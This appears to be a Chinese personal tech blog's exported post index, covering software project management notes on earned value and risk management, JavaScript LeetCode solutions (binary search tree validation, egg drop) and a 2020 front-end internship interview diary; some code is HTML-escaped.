工作量估算的不准确 用户需求的变更 交流的不畅 人员的变更 受到其他不可预知情况的干扰 … 在项目监控过程中，洞悉项目的实际进展 了解项目的实际进展情况 项目计划 将实际进展与计划进行比较，了解偏差，以便采取措施 开发活动进展在项目监控过程中，洞悉开发活动实际进展 详细、具体了解各项活动的实际情况 开发活动的计划 将实际进展与计划进行比较，了解偏差，以便采取措施开发活动进展球形图(3/3)开发活动问题项目开发活动过程中，可能会遇到许多问题 具体项目的特殊情况 计划的不全面性 规程的不完备性 交流的不充分性项目展望展望项目在未来合适的时间段的情况 下一个主要里程碑 公开发布日期 产品交付日期 软件项目监控的目标和方式软件项目监控的目标通过监控对软件项目的实施提供可视性： 知道项目的实际执行和实施情况 知道项目实施过程中(可能)出现了哪些问题 知道如何采取措施防止问题的出现，或者出现时该采取什么办法减少它给软件项目实施带来的影响和损失 软件项目监控的方式 成立项目监控小组PTT(Project Tracing Team) 由项目组成员(小项目)或者负责人(大项目)组成 指定项目监控负责人 负责协调项目进度的监控工作 定期召开项目监控会议，获取项目实施的详细情况和面临的问题 最好定期每周一次了解项目实施情况汇报问题：口头报告或书面报告 成本监控（重点考核）成本监控的意义： 成本本身是项目的重要元素 成本监控能够展示已经花费了多少劳力 简单的监控方法－累计消耗图：缺点：不能说明项目的进展情况 累计消耗图＋项目时间信息： 挣值管理挣值管理方法目前已成为项目管理和控制中的主流方法，或者说是一个非常重要的管理方法。 实际上是建立在工期和成本联合控制方法上的一套技术 它是基于工作分解、估算及预算，根据项目的进度计划确定项目的工期、进展情况以及成本预算，对成本预算进行分配，监控项目的绩效进展。 挣值管理的优点： 准确地描述项目的状况 准确及时地确定趋势 准确及时地识别困难 为过程改进提供基础 BCWS（PV）：项目预算成本活动或项目预算成本（计划预算成本），简称BCWS。也称PV(计划成本)，即根据批准认可的进度计划和预算到某一时点应当完成的工作所需要投入的资金。这个值对衡量项目进度和费用都是一个基准，一般来说，PV在项目实施过程中应保持不变，除非预算、计划或者合同有变更。表示应做多少工作？ BCWP（EV）：挣值（已完成部分的预算成本）就是挣得的价值，即活动或项目完成以后的工作预算成本，也称EV(挣值Earned Value) ，即根据批准认可的预算，到某一时间点已经完成的工作应当投入的资金。表示做了多少工作？ ACWP（AC）:项目实际成本项目的实际成本常常用ACWP来表示，也称AC(实际成本) ，即到某一时间点已完成的工作实际花费或消耗的成本。 项目的预算成本、挣值和项目的实际成本都是随着时间而不断变化的，一直到项目结束为止。通常这三个曲线的变化特征像一个S曲线。 例子： 举例：某土方工程总挖方量为4000立方米，计划用10天完成，每天400立方米，预算单价为45元/立方米，该挖方工程预算总费用为180000元。开工后第7天早晨刚上班时业主项目管理人员前去测量，取得了两个数据：已完成挖方2000立方米，支付给承包单位的工程进度款累计已达120000元。 1、计算BCWP（实际完成工作的预算成本）BCWP =45元/立方米 ×2000立方米=90000元从这里可以看出，实际完成工作预算成本（BCWP）与项目进度没有直接关心，并不关系项目实际进度到了什么程度，只关系实际完成的工作量 2、计算BCWS（计划工作预算成本）开工后第6天结束时，承包单位应得到的工程进度款累计额为BCWS=108000元。 3、计算ACWP（完成工作的实际成本）本案例的ACWP很明显，直接给出了，ACWP=120000 CV：成本偏差CV=BCWP–ACWP成本偏差也就是挣值与实际成本两者之差。如果挣值大于实际成本，那么成本偏差是正的，它反映成本绩效比较好，反之，如果成本偏差是负数，代表的是成本的超支，就是成本项目的绩效有问题。 大于0 成本节约状态 小于0 成本超支状态 SV：进度偏差（Schedule Variance）SV=BCWP-BCWSSV，即进度偏差。进度偏差仍然用挣值做一个基本标准，用挣值减去当前活动或项目的预算成本，就是BCWP减去BCWS。进度本来应该是时间单位，但是在挣值管理方法里边，工期偏差可用货币进行描述（？）。 大于0 进度超前状态 小于0 进度滞后状态 成本绩效指数（CPI）挣值与实际成本之比 进度绩效指数（SPI）挣值与计划成本之比 挣值跟踪图 BAC：完工预算成本BAC也就是在活动或项目期末的时候总的计划成本是多少，即完工时的预算成本。 EAC：预计完工成本 EDC：预计完工日期项目的预计完工工期(EDC)＝原项目计划的工期(OD)/SPI 完工偏差VAC、VDC、ETC和预计的完工成本完工成本偏差(VAC)=BAC-EAC 完工的进度偏差（VDC）＝原工期(OD)－估计新工期(EDC) 预计完工成本偏差（ETC）=EAC-ACWP 完工进度比例＝BCWP/BAC 完工资金比例＝ACWP/BAC 某软件项目计划工期为4年，预算总成本为800万元。在项目的实施过程中，通过对成本的核算和有关成本与进度的记录得知，在开工后第二年年末的实际情况是：开工后二年末实际成本发生额为200万元，所完成工作的计划预算成本额为100万元。与项目预算成本比较可知：当工期过半时，项目的计划成本发生额应该为400万元。试分析项目的成本执行情况和计划完工情况。 12345678910由已知条件可知：PV=400万元 AC=200万元 EV=100万元CV=EV-AC=100-200=-100 成本超支100万元SV=EV-PV=100-400=-300 进度落后300万元SPI=EV/PV=100/400=25%二年只完成了只完成了总任务在1/4.CPI=EV/AC=100/200=50%完成同样的工作量实际发生成本是预算成本的2倍。EAC=BAC/CPI=400/0.5=800万元(当前)预计整个项目完成时的EAC=800/0.5=1600万该项目延期，并且超支了 软件配置管理软件配置管理（Software Configuration Management, SCM）是指通过执行版本控制、变更控制等规程，以及使用合适的配置管理软件，来保证所有配置项的完整性和可跟踪性。配置管理是对工作成果的一种有效保护。 配置管理与任何一位项目成员都有关系，因为每个人都会产生工作成果。配置管理是否有成效取决于三个要素：人、规范、工具 变更控制变更控制的目的是防止配置项被随意修改而导致混乱。 为了提高效率，对于处于“草稿状态”的配置项，不必进行变更控制，因为它们本来就是草稿，本来就是要被不断地修改的。 当配置项状态为“正式发布”，或者该配置项已经成为某个基线的一部分（即被“冻结”）时，如果要修改配置项的话，那么按照变更控制规则执行。 步骤： 第十章 软件项目风险管理什么是软件风险（重点）使软件项目的实施受到影响和损失、甚至导致失败的、可能会发生的事件 例如，人员的临时流失，计划过于乐观，设计的低劣 软件风险的分类 项目风险：威胁到项目计划如：进度、人力、资源、客户及需求等问题 技术风险：威胁到软件的质量及交付时间如：设计、实现、接口、验证和维护等问题 商业风险：威胁到软件的生存能力 环境风险：威胁到软件的合法性与相关法规相冲突，能否通过管理部门的鉴定 政治风险：会不会造成政治方面困扰 五大商业风险 市场风险开发了个没有人真正需要的优秀软件 策略风险开发的产品不再符合公司的整体商业策略 销售风险建造了一个销售部门不知道如何去卖的产品 管理风险由于重点的转移或团队人员的变动而失去了高级管理层的支持 预算风险没有得到预算或人力上的保证 什么是软件风险管理 对影响软件项目、过程或产品的风险进行评估和控制的实践过程。 在风险影响软件项目成功实施前，对它进行识别和处理，并预防和消除风险的发生 识别风险(会有哪些风险？) 预防和消除风险(最好别让风险发生) 制定风险发生后的处理措施(万一发生该怎么办？) 风险管理的组成 为什么需要软件风险管理（重点） 软件风险是软件与生俱来的； 软件风险随着系统复杂程度的增加而增加； 软件风险阻碍人们实现目标 软件项目风险管理可以降低软件项目风险造成的危害和损失 风险评估 风险识别：识别风险，形成风险列表 风险分析：判定每一个风险出现的概率、产生的影响及其重要性 风险优先级：按照每个风险的重要性排出一个风险优先级 多维度风险识别方法（重点）目标维：成本、进度、质量、安全 要求有相对的成本、项目目标、成本目标、进度目标、质量目标、安全目标，根据目标的维度分析可能存在的风险，像成本超支风险、进度拖延的风险、质量不合格的风险、安全隐患的风险。 时间维：不同阶段、需求分析、设计、编码/测试、集成项目的进展维度，在项目进展的不同阶段，对可能存在的风险进行分析。 因素维：技术、非技术可以按照技术风险、非技术风险进行风险识别。分析技术类的风险是人为风险还是管理的风险？从多个角度、多个维度进行风险识别，可以有效地把可能存在的风险找出来，为有效项目风险管理提供良好的基础。 软件风险的具体类别 计划编制 组织和管理 开发环境 最终用户 客户 承包商 需求 产品外部环境 人员 设计和实现 过程 风险分析定性风险分析方法和步骤 在定性分析中通常采用概率这个术语。 风险的概率是指某一个风险发生的可能性。 使用定性术语可以将风险的概率及其后果描述为极高、高、中、低、极低五档。风险后果是指风险发生对项目目标产生的影响。后者指的是一个结果，前者指的是一种可能性。 风险的这两个维度适用于具体风险事件，而不适用于项目整体。 使用风险概率和风险后果来分析风险，可以帮助我们甄别出哪些风险需要强有力的控制与管理。 运算规则风险发生可能性： VH H M L VL损失严重性： VH H M L VL风险运算规则：LL=VLMM=MHH=VHMH=HML=L 定性风险分析方法评估风险发生的概率主观性较强，采用方法 熟悉系统、有经验的人参与评估 多人独立评估，综合折中 采用分类：非常可能(0.8-1.0), 很可能(0.6-0.8)，或许(0.4－0.6)，不太可能(0.2-0.4)，不可能(0-0.2) 定量风险分析方法定量风险分析过程的目标是量化分析每一风险的概率及其对项目目标造成的后果，同时也要分析项目总体风险的程度。这一过程使用的技术手段和决策分析包括： 测定达成某一特定项目目标的概率，概率越大，目标达成的可能性越大； 量化项目的风险暴露额，决定可能需要的成本大小和进度计划应急准备金的大小、数量； 通过量化各风险对项目风险的相应影响，甄别出最需要关注的风险； 找出理想的和可实现的成本、进度计划及工作范围目标。 定量风险分析方法概率分布通过量化分析，量化各风险对项目总风险的影响，找出哪些是需要关注的风险。按照轻重对风险进行排序，找出理想的对策。 量化风险分析涉及到一些概率论的基本知识，这就需要了解概率的分布特征。概率的分布主要有四种： 离散分布和连续分布 均匀分布 正态分布 β分布 概率变量:风险损失的期望值、标准差或方差 应用PERT技术确定活动的概率（重点）最可能时间：期望任务在正常情况下所花的时间(m)乐观的时间：期望任务完成的最短时间（a）悲观的时间：考虑所有可能情况下的最坏可能时间（b）期望时间（均值）：te 例子：解答：（1）求出σ： σ = （36-6）/ 6 = 5（2） 由 σ可知 21+5=26 21-5=16， 因此16—26天落在1 σ分布内。（3） 由1 σ的概率P为68.26可得答案为 B. 68.26%注意：必须记住三个数字是 1σ 68.26% 2σ 95.46% 3σ 99.7% PERT活动时间的估计PERT网络：计算活动和事件标准偏差： 风险优先级（重点） 统计表明，项目80%成本用于解决20%的问题 风险管理重点关注20％重要的部分 根据风险的危险度确定风险的重要性，忽略其他的部分 评估风险发生造成的损失：可以基于“进度”，“成本”或者“工作量”来进行估算 风险危险度 = 风险概率 × 风险损失根据上述计算优先级： 风险控制风险管理计划针对每一个重要的风险，制定一个处理该风险的计划 风险由谁引起 表现形式是什么 可能什么时候发生 为什么发生 如何避免或者消除它的发生 发生后的处理措施 风险化解（重点） 避免风险：推迟小谢的离开时间 转移风险：将风险从系统的一部分转移到另一部分，让客户来做 风险减轻：消除发生风险的根源，加薪 发布风险：不会突然和惊讶 接受和控制风险：接受并提供处理计划，安排小王接替小谢的工作 记录风险：为将来项目风险管理提供历史数据 根据不同条件，不同的环境或者不同的问题可以选择不同的对策 概率高低以及后果损失大小，组成了一个四维空间。①概率发生率高，后果损失较小；②概率发生率比较低，后果损失小；③概率发生率高，后果损失大；④概率发生率比较低，后果损失大。 风险监控检查风险的化解程度及其变化(概率、损失) 风险监控的方式 监控和跟踪重要的(前10个)风险，记录风险危险度的变化以及风险化解的进展 中间审查，在每个里程碑后进行小规模的走查 任命风险官员(适合于大项目)，警告项目风险，防止项目经理和开发人员忽略计划中的风险管理","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"软件项目策划与管理","slug":"技术/计算机通识/软件项目策划与管理","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E8%BD%AF%E4%BB%B6%E9%A1%B9%E7%9B%AE%E7%AD%96%E5%88%92%E4%B8%8E%E7%AE%A1%E7%90%86/"}],"tags":[]},{"title":"leetcode-验证二叉搜索树","slug":"leetcode-验证二叉搜索树","date":"2020-05-04T16:00:00.000Z","updated":"2024-05-25T04:21:29.805Z","comments":true,"path":"2020/05/05/leetcode-验证二叉搜索树/","link":"","permalink":"https://wtaufpziv.github.io/2020/05/05/leetcode-%E9%AA%8C%E8%AF%81%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/","excerpt":"验证二叉搜索树（难度：中等）给定一个二叉树，判断其是否是一个有效的二叉搜索树。 假设一个二叉搜索树具有如下特征： 节点的左子树只包含小于当前节点的数。 节点的右子树只包含大于当前节点的数。 所有左子树和右子树自身必须也是二叉搜索树。这道题首先结合二叉树的普遍解题步骤可以立刻想到借用递归，从根节点开始向下遍历，过程中维护一个区间【a，b】，那么对于当前节点的左子树，要满足所有节点的值在【a，当前节点值】之间，当前节点的右子树，要满足所有节点的值在【当前节点值，b】之间。在遍历过程中不断更新这个区间即可","text":"验证二叉搜索树（难度：中等）给定一个二叉树，判断其是否是一个有效的二叉搜索树。 假设一个二叉搜索树具有如下特征： 节点的左子树只包含小于当前节点的数。 节点的右子树只包含大于当前节点的数。 所有左子树和右子树自身必须也是二叉搜索树。这道题首先结合二叉树的普遍解题步骤可以立刻想到借用递归，从根节点开始向下遍历，过程中维护一个区间【a，b】，那么对于当前节点的左子树，要满足所有节点的值在【a，当前节点值】之间，当前节点的右子树，要满足所有节点的值在【当前节点值，b】之间。在遍历过程中不断更新这个区间即可 代码如下： 123456789101112var isValidBST = function(root) &#123; return isbst(root, -Number.MAX_VALUE, Number.MAX_VALUE)&#125;;function isbst(root, min, max)&#123; if(root === null) return true if(root.val &lt;= min || root.val &gt;= max)&#123; return false &#125; else&#123; return isbst(root.left, min, root.val) &amp;&amp; isbst(root.right, root.val, max) &#125;&#125; 除了这个方法之外，我们就需要结合二叉搜索树一个很重要的功能，或者说是性质： 二叉搜索树的中序遍历序列是严格递增的 所以我们只需要判断一下这个二叉树的中序遍历序列是不是递增序列就可以了 12345678910111213141516171819202122var isValidBST = function(root) &#123; let arr = [] if(root !== null)&#123; isbst(root, arr) for(let i = 1; i &lt; arr.length; i++)&#123; if(arr[i] &lt; arr[i - 1])&#123; return false &#125; &#125; return true &#125; else&#123; return true &#125;&#125;;function isbst(root, arr)&#123; if(root)&#123; isbst(root.left, arr) arr.push(root.val) isbst(root.right, arr) &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"2020春招面经","slug":"2020春招面经","date":"2020-04-29T16:00:00.000Z","updated":"2024-05-25T04:21:30.308Z","comments":true,"path":"2020/04/30/2020春招面经/","link":"","permalink":"https://wtaufpziv.github.io/2020/04/30/2020%E6%98%A5%E6%8B%9B%E9%9D%A2%E7%BB%8F/","excerpt":"在写这篇博客的前一天，我终于收到了整个春招第一份（也许是唯一一份offer），回顾整个春招的辛酸历程，用一篇博客简单记录一下吧 这一次的春招可以说是自己第一次以应聘者的身份对职场进行一次小小的摸索，大大小小的公司都投递了一些，投递的公司职位和时间如下：","text":"在写这篇博客的前一天，我终于收到了整个春招第一份（也许是唯一一份offer），回顾整个春招的辛酸历程，用一篇博客简单记录一下吧 这一次的春招可以说是自己第一次以应聘者的身份对职场进行一次小小的摸索，大大小小的公司都投递了一些，投递的公司职位和时间如下： 2020年3月1日：完美世界前端开发实习生——牛客网投递（截止这篇博客，没有收到任何消息，倒是广告往我邮箱塞了不少） 2020年3月5日：蘑菇街前端开发实习生——官网投递使用内推码（简历挂，当时真没想到，有点懵逼） 2020年3月11日：360公司前端开发实习生——内推员工邮件投递（笔试挂，这是我笔试所有公司里面唯一考了行测的公司，前端题目很常规，算法有点小难） 2020年3月18日：快手前端开发实习生——官网投递使用内推（offer，经历了笔试、一面、二面、hr面。感谢快手爸爸(●’◡’●)） 2020年3月19日：美团点评前端开发实习生——官网投递使用内推（过了笔试，一面挂，笔试题目比较常规） 2020年3月25日：斗鱼前端开发实习生——官网投递使用内推（笔试完至今无消息） 2020年3月25日：七牛云前端开发实习生——官网投递使用内推（笔试时间冲突放弃了） 2020年4月1日：作业帮前端开发实习生——官网投递使用内推（面试时间冲突，然后就被pass掉了，所以不要轻易鸽面试官，基本上人家不会再给你重新安排时间的） 2020年4月1日：字节跳动前端开发实习生——官网投递使用内推（一面挂，有一说一，有点小难） 2020年4月5日：腾讯前端开发实习生——官网投递使用内推（噩梦的开始，来自马总的三次鞭尸大礼包，最终挂） 2020年4月6日：腾讯微众银行前端开发实习生——官网投递（笔试完至今无消息） 2020年4月9日：米哈游前端开发实习生——官网投递（简历挂） over 不要问我为什么金三银四的四月后半月没再投递了，别问，问就是差点人都没了投递的公司基本上都给了笔试机会，腾讯和字节走的提前批没有笔试，直通面试，给了面试机会的有美团、快手、腾讯、字节、作业帮。最终鸽了作业帮，总共面试11场。 先分别写一下面试题目吧，答案就不附在上面了。不过题目是在面试的时候匆匆写下，不一定完全写完，可能有遗漏 美团（3月29日-10:00 一面挂）1、自我介绍2、说一下前后端分离3、你刚刚有提到前端后台化的趋势，说说这个过程中有什么技术演变4、node主要用于一些什么场景5、说一下mvc和mvvm6、你说react更多的关注view层，那它除了view层还解决了什么问题7、react组件中key的作用，在渲染列表时为什么不能用index作为key8、说一下react的diff算法9、说一下react声明周期10、组件dom更新可以放在哪些生命周期11、为什么不建议直接操作真实dom，除了性能以外这会带来其他的什么影响+12、平时怎么学习前端代码题：13、实现不定高宽元素的水平垂直居中14、margin重叠的原因是什么，如何消除15、你说使用float浮动，解释一下为什么输入：1[&#123;id:1&#125;, &#123;id:2, child:[&#123;id:3&#125;, &#123;id:4&#125;]&#125;]输出：1[&#123;id:1, id:2, id:3, id:4&#125;] 腾讯CSIG网络平台部一面4月3日-15:001、自我介绍2、做了些什么项目3、项目中的难点4、项目中有没有涉及到安全性相关的问题5、说一下csrf和xss6、https的握手过程7、css选择器权重8、react-hook解决了什么问题9、平衡二叉树的概念10、数组去重的方式11、ipv4与ipv6的区别12、OSI七层网络模型说一下13、IP属于那一层，http属于哪一层14、希尔排序与快速排序的过程思想15、redux怎样修改store中的数据16、cookie、localStorage、sessionStorage的区别17、token的验证机制，一般存放在哪里，怎么携带进行验证18、反问 二面4月4日-19:00（挂）1、说一下你的项目难点2、你说这些我感觉不到有什么难点，再仔细想想（？？？？？）3、你的网易云音乐项目只做了纯页面？没自己实现后台吗？用的API？那感觉没什么难度啊？？？？？？4、让你设计一个token，你会怎么设计5、你是计算机专业的？软件工程学过吧6、说一下黑盒测试和白盒测试7、说一下单元测试和集成测试8、怎么处理高并发 二面这个面试官应该压根就不是搞前端的… 腾讯WX事业部一面4月8日-15:00（挂）1、说一下electron这个项目2、一个列表卡顿有哪些原因3、electron的主进程和渲染进程4、有用electron实践过进程之间的通信吗 编程题：leetcode-偷金店问题 腾讯PCG一面1、项目难点，怎么解决2、var、let、const的区别3、说一下浏览器缓存4、前端学习方法5、说一下原型与yuanxinglian6、写一个菲波那切数列7、JS实现拖拽8、大数相加9、硬件加速触发的机制，有什么好处10、反问 二面（挂）三到算法题：leetcode-括号序列；后面两题忘了是什么。都写出来了，但面试官说不是最优解要继续优化，炸裂！！ 字节跳动（挂）1、说一下mvc和mvvm2、手写一个mvvm模式3、diff算法的O(N)时间复杂度是怎么实现的4、cdn加速原理、过程5、滚动优化6、水平垂直居中的实现7、九宫格布局的实现8、csrf与xss的区别9、实现一个xss防范的前端过滤方法10、智力题：现有60块砖，60个人。一个男人可以搬5块，一个女人可以搬3块，两个孩子可以搬一块，问要想搬完这60块砖，60个人当中有几个男人，几个女人，几个孩子。总共有多少种可能的组合 快手（offer）一面1、项目2、说一下JS的严格模式3、fetch和ajax有什么区别4、说一下etag5、讲一讲浏览器缓存6、css选择器权重7、css中padding设置为百分比之后是依据哪个进行计算的8、DOM操作常用API编程题：验证出栈的合法性 二面1、自我介绍2、（忘了…）3、轮播图的实现原理4、屏幕刷新率相关，60hz带来的影响5、TS了解过吗6、原型和原型链编程题：7、函数科里化8、手写一个组件","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"面经笔经","slug":"技术/前端/面经笔经","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/%E9%9D%A2%E7%BB%8F%E7%AC%94%E7%BB%8F/"}],"tags":[]},{"title":"leetcode-鸡蛋掉落","slug":"leetcode-鸡蛋掉落","date":"2020-04-10T16:00:00.000Z","updated":"2024-05-25T04:21:29.805Z","comments":true,"path":"2020/04/11/leetcode-鸡蛋掉落/","link":"","permalink":"https://wtaufpziv.github.io/2020/04/11/leetcode-%E9%B8%A1%E8%9B%8B%E6%8E%89%E8%90%BD/","excerpt":"鸡蛋掉落(难度：困难)你将获得 K 个鸡蛋，并可以使用一栋从 1 到 N 共有 N 层楼的建筑。 每个蛋的功能都是一样的，如果一个蛋碎了，你就不能再使用它，否则可以继续丢，鸡蛋的性能不会随着丢的次数增加而有所损耗。 假设存在一个中间楼层F，满足 0 &lt;= F &lt;= N 任何从高于 F 的楼层落下的鸡蛋都会碎，从 F 楼层或比它低的楼层落下的鸡蛋都不会破。 每次移动，你可以取一个鸡蛋（如果你有完整的鸡蛋）并把它从任一楼层 X 扔下（满足 1 &lt;= X &lt;= N）。 你的目标是确切地知道 F 的值是多少。 无论 F 的初始值如何，你确定 F 的值的最小移动次数是多少？ 示例 1： 输入：K = 1, N = 2输出：2解释：鸡蛋从 1 楼掉落。如果它碎了，我们肯定知道 F = 0 。否则，鸡蛋从 2 楼掉落。如果它碎了，我们肯定知道 F = 1 。如果它没碎，那么我们肯定知道 F = 2 。因此，在最坏的情况下我们需要移动 2 次以确定 F 是多少。 示例 2： 输入：K = 2, N = 6输出：3 示例 3： 输入：K = 3, N = 14输出：4","text":"鸡蛋掉落(难度：困难)你将获得 K 个鸡蛋，并可以使用一栋从 1 到 N 共有 N 层楼的建筑。 每个蛋的功能都是一样的，如果一个蛋碎了，你就不能再使用它，否则可以继续丢，鸡蛋的性能不会随着丢的次数增加而有所损耗。 假设存在一个中间楼层F，满足 0 &lt;= F &lt;= N 任何从高于 F 的楼层落下的鸡蛋都会碎，从 F 楼层或比它低的楼层落下的鸡蛋都不会破。 每次移动，你可以取一个鸡蛋（如果你有完整的鸡蛋）并把它从任一楼层 X 扔下（满足 1 &lt;= X &lt;= N）。 你的目标是确切地知道 F 的值是多少。 无论 F 的初始值如何，你确定 F 的值的最小移动次数是多少？ 示例 1： 输入：K = 1, N = 2输出：2解释：鸡蛋从 1 楼掉落。如果它碎了，我们肯定知道 F = 0 。否则，鸡蛋从 2 楼掉落。如果它碎了，我们肯定知道 F = 1 。如果它没碎，那么我们肯定知道 F = 2 。因此，在最坏的情况下我们需要移动 2 次以确定 F 是多少。 示例 2： 输入：K = 2, N = 6输出：3 示例 3： 输入：K = 3, N = 14输出：4 动态规划这个方法可以观看李永乐的视频，比较好理解 复工复产找工作？先来看看这道面试题：双蛋问题 维护一个状态数组dp,dp[i][j]代表一共有 i 层楼的情况下，使用 j 个鸡蛋的最少实验的次数。 说明： i 表示的是楼层的大小相对，不是绝对高度（第几层）的意思，例如楼层区间 [8, 9, 10] 的大小为 3。j 表示可以使用的鸡蛋的个数，它是约束条件。 对于这个数组，我们可以对它的一些特殊情况进行初始化 只有一个鸡蛋：最少移动数就是楼层数。只有一层楼：永远只需要移动一次 那么接下来对于每一个高度i我们就需要进行枚举，在0到i之间选一个楼层k开始试验，k从1开始直到i，就可以依次填写这个数组 对于当前的楼层k，k &gt;= 1 且 k &lt;= i： 如果鸡蛋破碎，实验就得在 k 层以下做（不包括 k 层），这里已经使用了一个鸡蛋，简单来说就是楼层数减一，鸡蛋数减一，即求：dp[k - 1][j - 1]； 如果鸡蛋完好，那么就要去k楼层以上进行试验。那么对于表中的i层楼，剩下的楼层数就是i- k，所以这个时候即求：dp[i - k][j]) 那么对于同一个k取值时存在摔碎与没摔碎两种情况，我们要去求最差情况，也就是两者之间的最大值 对于不同k之间的取值，我们需要取两者之间的最小值 代码如下： 123456789101112131415var superEggDrop = function(K, N) &#123; let dp = new Array(N + 1) for(let i = 0; i &lt;= N; i++)&#123; dp[i] = new Array(K + 1).fill(i) &#125; for(let i = 2; i &lt;= N; i++)&#123; for(let j = 2; j &lt;= K; j++)&#123; for (let k = 1; k &lt;= i; k++) &#123; dp[i][j] = Math.min(dp[i][j], Math.max(dp[k - 1][j - 1], dp[i - k][j]) + 1); &#125; &#125; &#125; return dp[N][K]&#125;; 在上述解法中，由于开辟了一个二维数组dp，所以空间复杂度为O(NK)。填表本身的时间复杂度为O(NK)， 但是对于表中的每一项（也就是每一个高度）,都要对从哪里开始实验进行枚举，所以时间复杂度变为O(KN^2) 所以不出意外，这道题提交直接TLE 动态规划（重写状态转移方程）这道题可以进行一下逆行思维，将状态转移方程dp[i][j]看成，当你有j和鸡蛋，最多可以走i步，你最多可以验证dp[i][j]高的楼层 那么对于dp[i][j]来说，dp[i][j] = dp[i - 1][j - 1] + dp[i - 1][j] + 1 j 个蛋，且只能操作 i 次了，所能确定的楼层。123456789101112131415161718192021222324252627282930&#96;&#96;&#96;dp[i - 1][j]&#96;&#96;&#96;：蛋没碎，因此该部分决定了所操作楼层的上面所能容纳的楼层最大值&#96;&#96;&#96;dp[i-1][j-1]&#96;&#96;&#96;：蛋碎了，因此该部分决定了所操作楼层的下面所能容纳的楼层最大值那么最终dp数组中最后一列中刚刚大于楼层数N的那一个数所在的行数就是最小操作数![](&#x2F;images&#x2F;assets&#x2F;20200411115431149.png)代码如下：&#96;&#96;&#96;javascriptvar superEggDrop &#x3D; function(K, N) &#123; let dp &#x3D; new Array(N) for(let i &#x3D; 0; i &lt; N; i++)&#123; if(i &#x3D;&#x3D;&#x3D; 0)&#123; dp[i] &#x3D; new Array(K).fill(1) &#125; else&#123; dp[i] &#x3D; new Array(K).fill(i + 1) &#125; &#125; for(let i &#x3D; 1; i &lt; N; i++)&#123; for(let j &#x3D; 1; j &lt; K; j++)&#123; dp[i][j] &#x3D; dp[i - 1][j] + dp[i - 1][j - 1] + 1 &#125; if(dp[i][K - 1] &gt;&#x3D; N)&#123; return i + 1 &#125; &#125; return dp[0][K - 1]&#125;; 再优化对于上述的dp数组我们发现，第 f 次操作结果只和第 f-1 次操作结果相关，因此我们可以把dp压缩成为一个一维数组，我们发现纵向最多允许操作数是顺序增长的，所以我们可以把纵向最大操作数取消，使用一个变量count递增来代替，保留鸡蛋数，dp[i]代表有i个鸡蛋时，当前count次操作后可以确认的楼层数。. 代码如下： 1234567891011var superEggDrop = function(K, N) &#123; let dp = new Array(K + 1).fill(0) let count = 0 while(dp[K] &lt; N)&#123; for(let i = K; i &gt; 0; i--)&#123; dp[i] = dp[i] + dp[i - 1] + 1 &#125; count ++ &#125; return count&#125;;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"leetcode-打家劫舍","slug":"leetcode-打家劫舍","date":"2020-04-09T16:00:00.000Z","updated":"2024-05-25T02:28:45.253Z","comments":true,"path":"2020/04/10/leetcode-打家劫舍/","link":"","permalink":"https://wtaufpziv.github.io/2020/04/10/leetcode-%E6%89%93%E5%AE%B6%E5%8A%AB%E8%88%8D/","excerpt":"打家劫舍（难度：简单）你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警。 给定一个代表每个房屋存放金额的非负整数数组，计算你在不触动警报装置的情况下，能够偷窃到的最高金额。 示例 1: 输入: [1,2,3,1]输出: 4解释: 偷窃 1 号房屋 (金额 = 1) ，然后偷窃 3 号房屋 (金额 = 3)。 偷窃到的最高金额 = 1 + 3 = 4 。 示例 2: 输入: [2,7,9,3,1]输出: 12解释: 偷窃 1 号房屋 (金额 = 2), 偷窃 3 号房屋 (金额 = 9)，接着偷窃 5 号房屋 (金额 = 1)。 偷窃到的最高金额 = 2 + 9 + 1 = 12 。","text":"打家劫舍（难度：简单）你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警。 给定一个代表每个房屋存放金额的非负整数数组，计算你在不触动警报装置的情况下，能够偷窃到的最高金额。 示例 1: 输入: [1,2,3,1]输出: 4解释: 